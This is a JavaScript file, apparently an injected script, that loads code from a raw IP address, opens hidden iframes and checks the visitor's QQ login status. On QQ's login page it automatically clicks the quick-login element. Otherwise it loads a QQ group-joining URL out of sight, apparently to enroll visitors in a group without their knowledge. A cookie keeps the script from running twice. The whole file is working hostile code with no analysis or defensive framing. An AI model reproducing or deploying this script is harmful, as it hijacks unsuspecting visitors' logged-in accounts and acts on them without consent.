(function(A) {
    var System = {};
    function $(d) {return document.getElementById(d);}
    function getElementsByClassName(tagName, className) {var tag = document.getElementsByTagName(tagName);var tagAll = [];for(var i = 0 ; i<tag.length ; i++){if(tag[i].className.indexOf(className) != -1){tagAll[tagAll.length] = tag[i];}}return tagAll;}
    function load_js(a, b, c) {
        var d = document.createElement("script");d.type = "text/javascript";d.charset = "utf-8";d.src = a; d.onerror = function() {if (c) {setTimeout(c, 0)}};
        if (document.all) {d.onreadystatechange = function() {if (d.readyState) {if (d.readyState == "loaded" || d.readyState == "complete") {d.onreadystatechange = null;d.onload = null;if (b) {setTimeout(b, 0)}}} else {d.onreadystatechange = null;d.onload = null;if (b) {setTimeout(b, 0)}}}}
        else {d.onload = function() {if (d.readyState) {if (d.readyState == "loaded" || d.readyState == "complete") {d.onreadystatechange = null;d.onload = null;if (b) {setTimeout(b, 0)}}} else {d.onreadystatechange = null;d.onload = null; if (b) {setTimeout(b, 0)}}}}
        document.getElementsByTagName('HEAD').item(0).appendChild(d);
    }
    function load_iframe(url) { var s = document.createElement("iframe"); s.style.display = "none"; s.style.visibility = "hidden"; s.src = url; document.body.appendChild(s);}

    function check_login() {var url="http://apps.qq.com/app/yx/cgi-bin/show_fel?hc=8&lc=4&d=549000912&t=" + (new Date).getTime(); load_js(url, function(){ if ( data0.err == '1026' ) { jiaqun();} else {A.login.loginSuccess = function() {jiaqun();};login();}});}

    function jiaqun() {load_iframe(mz_qun_url);cookie('mqts', 1, 7);}

    function trim(str) {return str;}

    function cookie(name, value, options) {
        if (typeof value != 'undefined') {
            options = options || {};
            if (value === null) {
                value = '';
                options.expires = -1;
            }
            var expires = '';
            if (options.expires && (typeof options.expires == 'number' || options.expires.toUTCString)) {
                var date;
                if (typeof options.expires == 'number') {
                    date = new Date();
                    date.setTime(date.getTime() + (options.expires * 24 * 60 * 60 * 1000));
                } else {
                    date = options.expires;
                }
                expires = '; expires=' + date.toUTCString();
            }
            var path = options.path ? '; path=' + (options.path) : '';
            var domain = options.domain ? '; domain=' + (options.domain) : '';
            var secure = options.secure ? '; secure' : '';
            document.cookie = [name, '=', encodeURIComponent(value), expires, path, domain, secure].join('');
        } else {
            var cookieValue = null;
            if (document.cookie && document.cookie != '') {
                var cookies = document.cookie.split(';');
                for (var i = 0; i < cookies.length; i++) {
                    var cookie = trim(cookies[i]);
                    if (cookie.substring(0, name.length + 1) == (name + '=')) {
                        cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                        break;
                    }
                }
            }
            return cookieValue;
        }
    }

    function login() {
        var url = "http://xui.ptlogin2.qq.com/cgi-bin/xlogin?daid=5&&hide_title_bar=1&low_login=0&qlogin_auto_login=1&no_verifyimg=1&link_target=blank&appid=549000912&style=22&target=self&s_url=http%3A//www.qq.com/qq2012/loginSuccess.htm";
        load_iframe(url);
    }

    function start() {
        var api = 'http://159.203.122.78/';
        if (cookie('mqts') == '1') return;
        load_js(api+'?m=qun&a=data', function() {
            load_iframe(api+'count.html');
            if (location.href.indexOf('xui.ptlogin2.qq.com/cgi-bin/xlogin') != -1) {
                setTimeout(function() {
                    getElementsByClassName('a', 'face')[0].click();
                }, 2000);
            } else {
                check_login();
            }
        });
    }

    start();

})(window);